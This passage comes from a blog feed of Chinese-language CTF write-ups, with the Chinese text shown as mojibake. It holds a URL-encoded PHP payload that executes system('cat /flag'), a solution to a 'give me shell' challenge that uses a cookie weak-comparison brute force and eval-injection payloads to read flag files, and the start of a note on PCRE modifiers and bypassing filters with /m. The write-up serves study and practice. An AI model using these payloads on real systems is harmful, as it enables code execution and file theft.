class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">2</span>e<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>f<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token comment">//</span></code></pre><p>å› ä¸ºæºå¸¦è®¸å¤šä¸å¯æ‰“å°çš„å­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦ç»è¿‡urlç¼–ç åå‘åŒ…ä¼ å…¥ï¼Œä»¥ä¸Šä»£ç ç¿»è¯‘è¿‡æ¥å°±æ˜¯ï¼š<code>ASSERT($_POST[_]);</code>ï¼Œå³å¯<code>post</code>ä¸€ä¸ª<code>_</code>ï¼Œå­—ç¬¦æ‰§è¡Œä»£ç ï¼Œ<code>_=system(&#39;cat /flag&#39;);</code>ï¼Œå³å¯æ‹¿åˆ°<code>flag</code></p><h3 id="WEB-ç»™ä½ shell"><a href="#WEB-ç»™ä½ shell" class="headerlink" title="WEB_ç»™ä½ shell"></a>WEB_ç»™ä½ shell</h3><p>F12çœ‹åˆ°æºç ï¼Œä¸”æœ‰ä¸ªæç¤º<code>flag is in /flag.txt</code>ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//It's no need to use scanner. Of course if you want, but u will find nothing.</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'view_source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">checkCookie</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':'</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'&#123;"secret"'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[\"0-9A-Z]*&#125;$/'</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">2</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">theFirstTimeSetCookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">haveFun</span><span class="token punctuation">(</span><span class="token variable">$_f_g</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_g_r</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>    <span class="token variable">$_m_u</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_f_g</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_h_p</span> <span class="token operator">=</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$_m_u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$_g_r</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$_i</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_h_p</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_i</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$_i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$_i</span> <span class="token operator">&amp;</span> <span class="token number">0xC0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">die</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&#123;"secret":"'</span> <span class="token operator">.</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'y1ng'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"&#125;'</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7200</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">checkCookie</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$obj</span> <span class="token operator">=</span> @<span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$obj</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'give_me_shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$flag_md5</span> <span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">haveFun</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"here is your webshell: <span class="token interpolation"><span class="token variable">$shell_path</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">die</span><span class="token punctuation">;</span></span></code></pre><p>ä»£ç å®¡è®¡åå‘ç°æ˜¯éœ€è¦<code>get</code>ä¸€ä¸ª<code>give_me_shell</code>ï¼Œéšåæ‰å¯ä»¥è¿›å…¥å‡½æ•°ä¸­çš„ä¸‰ç›®è¿ç®—ç¬¦è¿›è¡Œä¿¡æ¯çš„è¯»å–ï¼Œä¸”éœ€è¦<code>$obj[&#39;secret&#39;] == $flag_md5(æ¨æµ‹ä¸º$flagçš„md5å€¼)</code>ï¼Œæ‰å¯ä»¥è¿›è¡Œ<code>echo &quot;here is your webshell: $shell_path&quot;;</code>æ“ä½œ</p><p>ç¬¬ä¸€ä¸ªä¸‰ç›®è¿ç®—ç¬¦å¤„å¯ä»¥è®¾ç½®ä¸€ä¸ªåä¸º<code>secret</code>çš„<code>cookie</code>ï¼Œå¦‚æœæœªè®¾ç½®çš„è¯ç³»ç»Ÿå°±ä¼šè‡ªåŠ¨å¸®ä½ è®¾ç½®ï¼Œéšåè®¾ç½®çš„<code>cookie</code>ï¼Œ<code>secret</code>èµ‹å€¼ç»™<code>$json</code>ï¼Œè¿›å…¥<code>checkCookie</code>å‡½æ•°ï¼Œè§‚å¯Ÿå‡½æ•°å¯å¾—çŸ¥<code>$json</code>ä¸­çš„æ ¼å¼éœ€è¦æ»¡è¶³ä¸€ä¸ª<code>json</code>çš„æ ¼å¼ï¼Œä¸”<code>json</code>ä¸­<code>secret</code>å€¼çš„æ ¼å¼éœ€æ»¡è¶³<code>&#39;/^[\&quot;0-9A-Z]*&#125;$/&#39;</code>ï¼Œç„¶åæ‰èƒ½è¿”å›<code>true</code>ï¼Œè¿›å…¥<code>json_decode</code>ï¼Œå°†<code>secret</code>çš„å€¼è§£æå‡ºæ¥ï¼Œå¦åˆ™<code>die(&#39;no&#39;);</code>ï¼Œäºæ˜¯æˆ‘ä»¬å…ˆä¼ å…¥ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„<code>secret</code>cookieï¼Œçœ‹çœ‹<code>haveFun($flag)</code>å‡½æ•°è¿”å›ä»€ä¹ˆï¼Œå‘åŒ…åå‘ç°è¿”å›è¿™æ ·çš„ä¸€ä¸ªå­—ç¬¦ä¸²0006464640064064646464006406464064640064006400000000000ï¼Œä¸º<code>$flag</code>ç»è¿‡<code>haveFun</code>å‡½æ•°åè¿”å›çš„å€¼ï¼Œè§‚å¯Ÿå‡½æ•°ï¼Œå…¶ä¸­å¯¹<code>$flag</code>è¿›è¡Œäº†md5åŠ å¯†åï¼Œå¯¹å…¶ä¸­çš„æ¯ä¸€ä¸ªå­—ç¬¦éƒ½ç»è¿‡<code>ord</code>å‡½æ•°ä¸<code>0xC0</code>ç»è¿‡äº†ä¸è¿ç®—</p><p>æµ‹è¯•åå‘ç°ï¼Œå¦‚æœæ˜¯æ•°å­—å’Œ<code>0xC0</code>æ¥<code>&amp;</code>ç»“æœå°±æ˜¯0ï¼Œå¦‚æœæ˜¯å­—æ¯åˆ™ç»“æœæ˜¯64ï¼Œé‚£ä¹ˆåˆ™å¯ä»¥ç¡®å®š<code>$flag</code>çš„å‰ä¸‰ä½ä¸ºæ•°å­—ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å› ä¸º<code>$obj[&#39;secret&#39;] != $flag_md5</code>æ­¤å¤„ä¸ºå¼±æ¯”è¾ƒï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©<code>$obj[&#39;secret&#39;]</code>ï¼Œï¼ˆä¹Ÿå°±æ˜¯ä¼ å…¥cookieä¸­ secret å€¼ä¸­çš„secretçš„å€¼ï¼‰å‰ä¸‰ä½å’Œ<code>$flag_md5</code>çš„å‰ä¸‰ä½æ•°å­—ç›¸ç­‰å³å¯ï¼Œäºæ˜¯æ”¾åˆ°burpä¸­çˆ†ç ´ï¼Œå¾—åˆ°<code>secret=&#123;&quot;secret&quot;:115&#125;</code>ï¼Œéšåå¾—åˆ°<code>$shell_path</code>ä¿¡æ¯ï¼š <code>here is your webshell: w3b5HeLLlll123.php</code></p><p>è®¿é—®<code>w3b5HeLLlll123.php</code>å¾—åˆ°æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//there are some secret waf that you will never know, fuzz me if you can</span><span class="token keyword">require</span> <span class="token string double-quoted-string">"hidden_filter.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;script>location.href=\'./index.php\'&lt;/script>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$secret_waf</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//æ¸…ç©ºsession ä»å¤´å†æ¥</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\$_SESSION["</span> <span class="token operator">.</span> <span class="token variable">$code</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"]=false;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* * When you feel that you are lost, do not give up, fight and move on. * Being a hacker is not easy, it requires effort and sacrifice. * But remember â€¦ we are legion! *  â€”â€”â€”â€”Deep CTF 2020*/</span></span></code></pre><p>å‘ç°<code>eval</code>å‡½æ•°ï¼Œäºæ˜¯ä¼ å…¥codeï¼Œä½†æ˜¯ç»è¿‡äº†<code>preg_match</code>ï¼Œå¹¶ä¸”<code>$secret_waf</code>æ²¡ç»™å‡ºæ¥ï¼Œfuzzæµ‹è¯•åå‘ç°è¿‡æ»¤äº†å¤§å¤šæ•°å­—ç¬¦ï¼Œæ‹¬å·ã€å¼•å·ã€åˆ†å·ã€ç©ºæ ¼ ã€åå¼•å·ã€/ \ $ * # ^ &amp;ç­‰ç¬¦å·ï¼Œå¹¶ä¸”fã€sysã€includeä¹Ÿè¢«è¿‡æ»¤ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºpayloadï¼š<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</code></p><ul><li><code>]=1?&gt;</code>é—­åˆå‰é¢çš„ä¸­æ‹¬å·å’Œphpä»£ç ï¼Œéšåæ‰§è¡Œä¸€å¥è¯phpä»£ç </li><li>~ä¸ºåè½¬å­—ç¬¦ä¸²æ ¹æ®æºç æç¤ºè¯»å–<code>/flag.txt</code></li><li>ä½¿ç”¨<code>require</code>å¯ä»¥ä¸éœ€è¦æ‹¬å·</li><li><code>require</code>å’Œ<code>~</code>ä¹‹é—´ä¸éœ€è¦ç©ºæ ¼å°±å¯ä»¥æ‰§è¡Œ</li></ul><p>å¾—åˆ°<code>flag.txt</code>å†…å®¹ï¼š</p><pre class="language-none"><code class="language-none">å¯ä»¥ï¼Œè¯´æ˜ä½ ctfshowçš„çº¢åŒ…2æ²¡ç™½åšï¼Œflagåœ¨&#x2F;flagï¼ŒåŒæ ·çš„æ–¹æ³•å»è¯»å–å§ã€‚1]&#x3D;false;</code></pre><p>å†è¯»<code>/flag</code>ï¼š<code>?code=]=1?&gt;&lt;?=require~%d0%99%93%9e%98?&gt;</code>å¾—åˆ°<code>flag</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;â€œæ¸©æ•…è€ŒçŸ¥æ–°ï¼Œå¯ä»¥ä¸ºå¸ˆçŸ£â€â€”â€”å­”å­ã€Šè®ºè¯­ã€‹&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTFé¢˜" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="ä»£ç å®¡è®¡" scheme="https://www.extrader.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>phpæ­£åˆ™è¡¨è¾¾å¼(PCRE)æ¨¡å¼ä¿®é¥°ç¬¦</title>
    <link href="https://www.extrader.top/posts/57833c1a/"/>
    <id>https://www.extrader.top/posts/57833c1a/</id>
    <published>2020-05-19T10:24:20.000Z</published>
    <updated>2020-07-14T12:46:48.344Z</updated>
    
    <content type="html"><![CDATA[<p>phpå•åŒå¼•å·çš„åŒºåˆ«ï¼š</p><p>å•å¼•å·ï¼šphpä¸ä¼šè¯»å–é‡Œé¢çš„å˜é‡ï¼Œä½œä¸ºçº¯å­—ç¬¦ä¸²å¤„ç†</p><p>åŒå¼•å·ï¼šPHPä¼šå°è¯•è¯»å–é‡Œé¢çš„å˜é‡ï¼Œæˆ–è€…åæ–œæ è¡¨ç¤ºçš„ç‰¹æ®Šç¬¦å·ï¼Œä¾‹å¦‚<code>\n</code>ï¼Œ<code>\0</code>ç­‰</p><p>å¤„ç†å­—ç¬¦ä¸²å˜é‡æ›¿æ¢çš„è¿æ¥é€Ÿåº¦æ–¹é¢ï¼Œphp7å‰å•å¼•å·ä¼šå¿«äº›ï¼Œè€Œåœ¨php7ä¹‹åå°±æ²¡åŒºåˆ«äº†ï¼Œ<a href="https://www.laruence.com/2008/08/19/338.html">è¯¦è§</a></p><span id="more"></span><h3 id="i-PCRE-CASELESS"><a href="#i-PCRE-CASELESS" class="headerlink" title="i (PCRE_CASELESS)"></a><strong>i (PCRE_CASELESS)</strong></h3><p>ä½¿å¾—æ¨¡å¼å¤§å°å†™ä¸æ•æ„Ÿ</p><p>å¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œæ¨¡å¼ä¸­çš„å­—æ¯ä¼šè¿›è¡Œå¤§å°å†™ä¸æ•æ„ŸåŒ¹é…ã€‚å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519183504562.png" alt loading="lazy"></p><h3 id="m-PCRE-MULTILINE"><a href="#m-PCRE-MULTILINE" class="headerlink" title="m (PCRE_MULTILINE)"></a><strong>m (PCRE_MULTILINE)</strong></h3><p>ä½¿å¾—æ¨¡å¼åŒ¹é…ä¸Šä»»æ„è¡Œä¹‹åå°±è¿”å›true</p><p>é»˜è®¤æƒ…ä¸‹ï¼ŒPCREè®¤ä¸ºç›®æ ‡å­—ç¬¦ä¸²æ˜¯ç”±å•è¡Œå­—ç¬¦ç»„æˆçš„<strong>(ç„¶è€Œå®é™…ä¸Šå¯èƒ½ä¼šåŒ…å«å¤šè¡Œ)</strong>ï¼Œâ€è¡Œé¦–â€œå…ƒå­—ç¬¦<code>(^)</code>ä»…åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ï¼Œè€Œâ€è¡Œæœ«â€œå…ƒå­—ç¬¦<code>($)</code>ä»…åŒ¹é…å­—ç¬¦ä¸²æœ«å°¾ï¼Œæˆ–è€…æœ€åçš„æ¢è¡Œç¬¦<strong>(é™¤éè®¾ç½®äº†Dä¿®é¥°ç¬¦)</strong>ã€‚ä½†ä¹Ÿä»…ä»…æ˜¯è¡Œé¦–è¡Œæœ«ï¼Œå½“è¿™ä¸ªä¿®é¥°ç¬¦è®¾ç½®åï¼Œâ€œè¡Œé¦–â€å’Œâ€œè¡Œæœ«â€å°±ä¼šåŒ¹é…ç›®æ ‡å­—ç¬¦ä¸²ä¸­ä»»æ„æ¢è¡Œç¬¦ä¹‹å‰æˆ–ä¹‹åï¼Œå¦å¤–ï¼Œè¿˜åˆ†åˆ«åŒ¹é…ç›®æ ‡å­—ç¬¦ä¸²çš„æœ€å¼€å§‹å’Œæœ€æœ«å°¾ä½ç½®ï¼Œå½“æˆ‘ä»¬åœ¨å¾…åŒ¹é…çš„<code>subject</code>å¤„ä¼ å…¥ä¸€ä¸ªæ¢è¡Œç¬¦<strong>(å³%0a)</strong>çš„æ—¶å€™ï¼Œæ¢è¡Œç¬¦å‰çš„åŒ¹é…ä¸Šåï¼Œå³ä½¿åé¢çš„åŒ¹é…ä¸ä¸Šï¼Œè¡¨è¾¾å¼ä¼šè¿”å›1ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/image-20200519220256656.png" alt loading="lazy"></p><p>å¦‚æœ<code>/m</code>ä½¿ç”¨ä¸å½“å°±ä¼šå­˜åœ¨æ¼æ´ä»è€Œç»•è¿‡æŸäº›é™åˆ¶</p><h3 